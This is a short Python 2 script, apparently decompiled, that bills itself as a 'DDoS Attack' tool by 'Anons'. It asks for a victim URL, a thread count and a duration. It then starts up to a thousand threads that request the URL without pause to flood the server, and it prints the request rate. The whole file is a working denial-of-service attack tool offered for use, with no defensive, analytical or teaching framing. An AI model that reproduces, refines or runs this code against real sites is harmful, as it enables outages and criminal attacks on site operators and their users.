# Embedded file name: test.py
import urllib, os, threading, time, sys
print '\n                     ###################################\n'
print '                 80800808.....::DDoS Anons.ALex::.....808088080\n'
print '              ************************************************'
print
print '                 \t Tool Ddos Attack By Anons \n'
if os.name in ('nt', 'dos', 'ce'):
    os.system('title       ........::::: DDoS by Al :::::........')
    os.system('color e')
Close = False
Lock = threading.Lock()
Request = 0
Tot_req = 0

class Spammer(threading.Thread):

    def __init__(self, url, number):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number

    def run(self):
        global Lock
        global Tot_req
        global Close
        global Request
        Lock.acquire()
        print 'Starting thread #{0}'.format(self.num)
        Lock.release()
        while Close == False:
            try:
                urllib.urlopen(self.url)
                Request += 1
                Tot_req += 1
            except:
                pass

        Lock.acquire()
        print 'Closing thread #{0}'.format(self.num)
        Lock.release()
        sys.exit(0)


if __name__ == '__main__':
    try:
        num_threads = input('> Power(1000): ')
        t_tot = input('> Time(2): ')
    except:
        t_tot = 2

    timer = t_tot * 60
    t_tot = t_tot * 60
    while True:
        url = raw_input('> Victim: ')
        try:
            urllib.urlopen(url)
        except IOError:
            print 'Could not open specified url.'
        else:
            break

    for i in xrange(num_threads):
        Spammer(url, i + 1).start()

    time.sleep(2)
    print '#######################################################################'
    print '\n> Bot Are Loaded Sucessfully.'
    print '\n> DarkNess1921 is working hard. . .\n'
    while timer > 0:
        time.sleep(10)
        print '> DarkNess1921 @ ' + str(Request / 10.0) + ' Requests/s\tTotal Request: #' + str(Tot_req) + '\tTime left:', timer, 's'
        Request = 0
        timer -= 10

    print '\n> Average  @ ' + str(Tot_req / t_tot) + ' Requests/s'
    print '\n#######################################################################\n'
    raw_input('> DarkNess1921 is still working, now you can press enter to shutting down threads.')
    time.sleep(1)
    Close = True
